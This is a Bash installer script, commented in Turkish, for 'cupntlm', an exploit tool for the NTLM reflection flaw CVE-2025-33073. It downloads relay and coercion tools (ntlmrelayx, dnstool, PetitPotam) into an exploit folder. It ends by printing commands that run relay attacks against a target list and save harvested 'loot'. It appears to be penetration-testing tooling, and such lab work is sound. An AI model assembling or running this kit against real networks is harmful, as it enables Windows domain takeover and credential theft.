#!/bin/bash
# ═══════════════════════════════════════════════════════════
#  cupntlm — Kurulum Scripti
#  CVE-2025-33073 | NTLM Reflection Bypass
#  Kali Linux / Debian / Ubuntu
# ═══════════════════════════════════════════════════════════

set -e

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m'

log()     { echo -e "${CYAN}[*] $1${NC}"; }
success() { echo -e "${GREEN}[+] $1${NC}"; }
warn()    { echo -e "${YELLOW}[!] $1${NC}"; }
fail()    { echo -e "${RED}[-] $1${NC}"; exit 1; }
hint()    { echo -e "${YELLOW}    → $1${NC}"; }

echo -e "${CYAN}"
echo "╔══════════════════════════════════════════════════╗"
echo "║          cupntlm  |  Kurulum Scripti             ║"
echo "║          CVE-2025-33073 NTLM Reflection          ║"
echo "╚══════════════════════════════════════════════════╝"
echo -e "${NC}"

# ── Dizin Hazırlığı ───────────────────────────────────────
WORKDIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
EXPLOITDIR="$WORKDIR/exploit"

log "Çalışma dizini : $WORKDIR"
log "Exploit dizini : $EXPLOITDIR"

mkdir -p "$EXPLOITDIR"
success "exploit/ dizini hazır"

# ── 1. apt update ─────────────────────────────────────────
echo ""
log "Paket listesi güncelleniyor (apt update)..."
if [[ $EUID -ne 0 ]]; then
    warn "Root değilsin — apt update atlanıyor."
    hint "sudo bash setup.sh"
else
    apt-get update -qq && success "apt update tamam"
fi

# ── 2. Sistem Araçları Kontrolü ───────────────────────────
echo ""
log "Sistem araçları kontrol ediliyor..."
echo ""

MISSING_SYS=()

check_cmd() {
    local cmd="$1"
    local pkg="$2"
    local install_hint="$3"
    if command -v "$cmd" &>/dev/null; then
        success "$cmd ✓"
    else
        warn "$cmd bulunamadı"
        hint "Kur: $install_hint"
        MISSING_SYS+=("$pkg")
    fi
}

check_cmd "python3"  "python3"     "sudo apt install python3"
check_cmd "pip3"     "python3-pip" "sudo apt install python3-pip"
check_cmd "git"      "git"         "sudo apt install git"
check_cmd "wget"     "wget"        "sudo apt install wget"
check_cmd "nmap"     "nmap"        "sudo apt install nmap"

# netexec / crackmapexec (SMB signing kontrolü için, opsiyonel)
if command -v netexec &>/dev/null; then
    success "netexec ✓"
elif command -v crackmapexec &>/dev/null || command -v cme &>/dev/null; then
    success "crackmapexec ✓"
else
    warn "netexec / crackmapexec bulunamadı  (opsiyonel, SMB signing kontrolü için)"
    hint "Kur: sudo apt install netexec"
fi

# ── 3. Python Kütüphaneleri Kontrolü ─────────────────────
echo ""
log "Python kütüphaneleri kontrol ediliyor..."
echo ""

MISSING_PY=()

check_py() {
    local module="$1"
    local pkg="$2"
    if python3 -c "import $module" 2>/dev/null; then
        success "python3: $module ✓"
    else
        warn "python3: $module bulunamadı"
        hint "Kur: pip3 install $pkg --break-system-packages"
        MISSING_PY+=("$pkg")
    fi
}

check_py "impacket"  "impacket"
check_py "colorama"  "colorama"
check_py "dns"       "dnspython"

# ── 4. Bağımlı Araçlar (exploit/ dizinine) ────────────────
echo ""
log "Bağımlı araçlar exploit/ dizinine alınıyor..."
echo ""

# ── 4a. ntlmrelayx.py ────────────────────────────────────
if [[ -f "$EXPLOITDIR/ntlmrelayx.py" ]]; then
    success "ntlmrelayx.py zaten mevcut, atlanıyor"
else
    log "ntlmrelayx.py sistem genelinde aranıyor..."
    NTLM_PATH=$(find /usr -name "ntlmrelayx.py" 2>/dev/null | head -1)

    if [[ -n "$NTLM_PATH" ]]; then
        cp "$NTLM_PATH" "$EXPLOITDIR/"
        success "ntlmrelayx.py kopyalandı: $NTLM_PATH → exploit/"
    else
        log "Bulunamadı, impacket reposu klonlanıyor..."
        TMPDIR_IMPACKET="$WORKDIR/.tmp_impacket"
        [[ ! -d "$TMPDIR_IMPACKET" ]] && \
            git clone --quiet https://github.com/fortra/impacket "$TMPDIR_IMPACKET"
        find "$TMPDIR_IMPACKET" -name "ntlmrelayx.py" \
            -exec cp {} "$EXPLOITDIR/" \; 2>/dev/null
        success "ntlmrelayx.py exploit/ dizinine kopyalandı"
    fi
fi

# ── 4b. dnstool.py (krbrelayx) ───────────────────────────
if [[ -f "$EXPLOITDIR/dnstool.py" ]]; then
    success "dnstool.py zaten mevcut, atlanıyor"
else
    log "krbrelayx klonlanıyor (dnstool.py için)..."
    TMPDIR_KRB="$WORKDIR/.tmp_krbrelayx"
    if [[ ! -d "$TMPDIR_KRB" ]]; then
        git clone --quiet https://github.com/dirkjanm/krbrelayx "$TMPDIR_KRB"
    else
        cd "$TMPDIR_KRB" && git pull --quiet && cd "$WORKDIR"
    fi
    cp "$TMPDIR_KRB/dnstool.py" "$EXPLOITDIR/"
    success "dnstool.py exploit/ dizinine kopyalandı"
fi

# ── 4c. PetitPotam.py ────────────────────────────────────
if [[ -f "$EXPLOITDIR/PetitPotam.py" ]]; then
    success "PetitPotam.py zaten mevcut, atlanıyor"
else
    log "PetitPotam.py indiriliyor..."
    wget -q \
        "https://raw.githubusercontent.com/topotam/PetitPotam/main/PetitPotam.py" \
        -O "$EXPLOITDIR/PetitPotam.py" \
        && success "PetitPotam.py exploit/ dizinine indirildi" \
        || fail "PetitPotam.py indirilemedi — ağ bağlantısını kontrol et."
fi

# ── 4d. cupntlm.py → exploit/ ────────────────────────────
if [[ -f "$WORKDIR/cupntlm.py" ]]; then
    cp "$WORKDIR/cupntlm.py" "$EXPLOITDIR/"
    success "cupntlm.py exploit/ dizinine kopyalandı"
else
    warn "cupntlm.py bulunamadı — exploit/ dizinine kopyalanamadı"
fi

# ── 5. Doğrulama ──────────────────────────────────────────
echo ""
log "Dosya doğrulaması yapılıyor..."
echo ""

check_file() {
    if [[ -f "$EXPLOITDIR/$1" ]]; then
        success "exploit/$1 ✓"
    else
        warn "exploit/$1 eksik!"
    fi
}

check_file "cupntlm.py"
check_file "ntlmrelayx.py"
check_file "dnstool.py"
check_file "PetitPotam.py"

# ── 6. Özet ───────────────────────────────────────────────
echo ""
echo -e "${CYAN}══════════════════════════════════════════════${NC}"

if [[ ${#MISSING_SYS[@]} -gt 0 || ${#MISSING_PY[@]} -gt 0 ]]; then
    echo -e "${YELLOW}  Kurulum tamamlandı — bazı bağımlılıklar eksik!${NC}"
    echo -e "${CYAN}══════════════════════════════════════════════${NC}"
    echo ""
    if [[ ${#MISSING_SYS[@]} -gt 0 ]]; then
        echo -e "  ${YELLOW}Eksik sistem paketleri:${NC} ${MISSING_SYS[*]}"
        hint "sudo apt install ${MISSING_SYS[*]}"
    fi
    if [[ ${#MISSING_PY[@]} -gt 0 ]]; then
        echo -e "  ${YELLOW}Eksik Python kütüphaneleri:${NC} ${MISSING_PY[*]}"
        hint "pip3 install ${MISSING_PY[*]} --break-system-packages"
    fi
else
    echo -e "${GREEN}  Kurulum eksiksiz tamamlandı!${NC}"
    echo -e "${CYAN}══════════════════════════════════════════════${NC}"
fi

echo ""
echo -e "  ${CYAN}Kullanım:${NC}"
echo ""
echo -e "  ${YELLOW}# Önce izin kontrolü:${NC}"
echo -e "  cd exploit"
echo -e "  sudo python3 cupntlm.py check \\"
echo -e "    --domain lab.local --user pentester --pass 'P@ss' \\"
echo -e "    --dc-ip 10.0.0.1 --relay-ip 192.168.1.100"
echo ""
echo -e "  ${YELLOW}# Per-target mod (her hedef için ayrı DNS kaydı):${NC}"
echo -e "  sudo python3 cupntlm.py per-target \\"
echo -e "    --targets targets.txt \\"
echo -e "    --domain lab.local --user pentester --pass 'P@ss' \\"
echo -e "    --dc-ip 10.0.0.1 --relay-ip 192.168.1.100 --loot loot.txt"
echo ""
echo -e "  ${YELLOW}# Single mod (tek DNS kaydı, kalıcı relay):${NC}"
echo -e "  sudo python3 cupntlm.py single \\"
echo -e "    --targets targets.txt \\"
echo -e "    --domain lab.local --user pentester --pass 'P@ss' \\"
echo -e "    --dc-ip 10.0.0.1 --relay-ip 192.168.1.100 --loot loot.txt"
echo ""
